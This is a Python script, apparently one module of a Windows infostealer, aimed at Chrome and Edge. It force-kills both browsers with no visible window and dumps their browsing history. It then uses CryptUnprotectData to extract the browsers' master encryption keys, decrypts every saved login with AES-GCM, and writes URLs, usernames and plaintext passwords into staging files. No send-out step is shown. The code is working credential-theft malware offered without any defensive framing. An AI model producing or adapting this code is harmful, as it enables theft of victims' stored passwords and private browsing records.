import os
import sqlite3
from Cryptodome.Cipher import AES 
from win32crypt import CryptUnprotectData
import json
import base64
import subprocess

user = os.getlogin()
passwords_count_chrome = 0
passwords_count_edge = 0

os.makedirs(f"{foldername}/Browser", exist_ok=True)
os.makedirs(f"{foldername}/Browser/History", exist_ok=True)
os.makedirs(f"{foldername}/Browser/Passwords", exist_ok=True)
os.makedirs(f"{foldername}/System")

subprocess.run("TASKKILL /F /IM chrome.exe", creationflags=subprocess.CREATE_NO_WINDOW)

chrome_hitory_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\History"

if os.path.exists(chrome_hitory_path):
   try:
      conn = sqlite3.connect(chrome_hitory_path)
      cursor = conn.cursor()

      request = "SELECT url, title, visit_count, last_visit_time FROM urls"
      cursor.execute(request)

      rows = cursor.fetchall()

      with open(f"{foldername}/Browser/History/Chrome.txt", "w", encoding='utf-8') as history:
         history.write("""
                                         ________________
   <====================================[HISTORY : CHROME]====================================>  
   """)
         for row in rows:
            url, title, visits_count, last_visit_time = row
            history.write(f"""               
____________________________________________________________________________
PAGE TITLE : {title}
URL : {url} 
VISIT COUNT : {visits_count} """)
   except:
      pass

edge_hitory_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\History"

subprocess.run("TASKKILL /F /IM msedge.exe", creationflags=subprocess.CREATE_NO_WINDOW)

if os.path.exists(edge_hitory_path):
   try:
         conn = sqlite3.connect(edge_hitory_path)
         cursor = conn.cursor()

         request = "SELECT url, title, visit_count, last_visit_time FROM urls"
         cursor.execute(request)

         rows = cursor.fetchall()

         with open(f"{foldername}/Browser/History/Edge.txt", "w", encoding='utf-8') as history:
            history.write("""
                                            ______________
      <====================================[HISTORY : EDGE]====================================>  
      """)
            for row in rows:
               url, title, visits_count, last_visit_time = row
               history.write(f"""               
____________________________________________________________________________
PAGE TITLE : {title}
URL : {url} 
VISIT COUNT : {visits_count} """)
   except:
      pass

local_state_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Local State"

if os.path.exists(local_state_path):
   try:
      with open(local_state_path, "r", encoding="utf-8") as file:
         local_state = json.load(file)

      encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
      master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
   except Exception:
      pass

   login_data_path = fr"C:\Users\{user}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"

   if os.path.exists(login_data_path):
      try:
         conn = sqlite3.connect(login_data_path)
         cursor = conn.cursor()

         query = "SELECT origin_url, username_value, password_value FROM logins"
         cursor.execute(query)

         with open(f"{foldername}/Browser/Passwords/Edge.txt", "w", encoding='utf-8') as pass_file:
            pass_file.write("""
                                             ________________
      <===================================[PASSWORDS : Edge]===================================>
      """) 
            for row in cursor.fetchall():
               passwords_count_edge += 1
               origin_url = row[0]
               username = row[1]
               encrypted_password = row[2] 

               iv = encrypted_password[3:15]
               payload = encrypted_password[15:]
               cipher = AES.new(master_key, AES.MODE_GCM, iv)
               decrypted_pass = cipher.decrypt(payload)[:-16].decode()
               pass_file.write(f"""
___________________________________________________________________________________________
URL : {origin_url}
USERNAME/MAIL : {username}
PASSWORD : {decrypted_pass}""")
      except:
         passwords_count_edge = "An error occured"
         pass

local_state_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Local State"

if os.path.exists(local_state_path):
   try:
      with open(local_state_path, "r", encoding="utf-8") as file:
         local_state = json.load(file)

      encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
      master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
   except Exception:
      pass

login_data_path = fr"C:\Users\{user}\AppData\Local\Google\Chrome\User Data\Default\Login Data"

if os.path.exists(login_data_path):
   try:
      conn = sqlite3.connect(login_data_path)
      cursor = conn.cursor()

      query = "SELECT origin_url, username_value, password_value FROM logins"
      cursor.execute(query)

      with open(f"{foldername}/Browser/Passwords/Chrome.txt", "w", encoding='utf-8') as pass_file:

         pass_file.write("""
   <===================================[PASSWORDS : Chrome]===================================>
   """)
         for row in cursor.fetchall():
            passwords_count_chrome += 1
            origin_url = row[0]
            username = row[1]
            encrypted_password = row[2] 

            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            pass_file.write(f"""
___________________________________________________________________________________________
URL : {origin_url}
USERNAME/MAIL : {username}
PASSWORD : {decrypted_pass}""")
   except:
      passwords_count_chrome = "` An error occured `"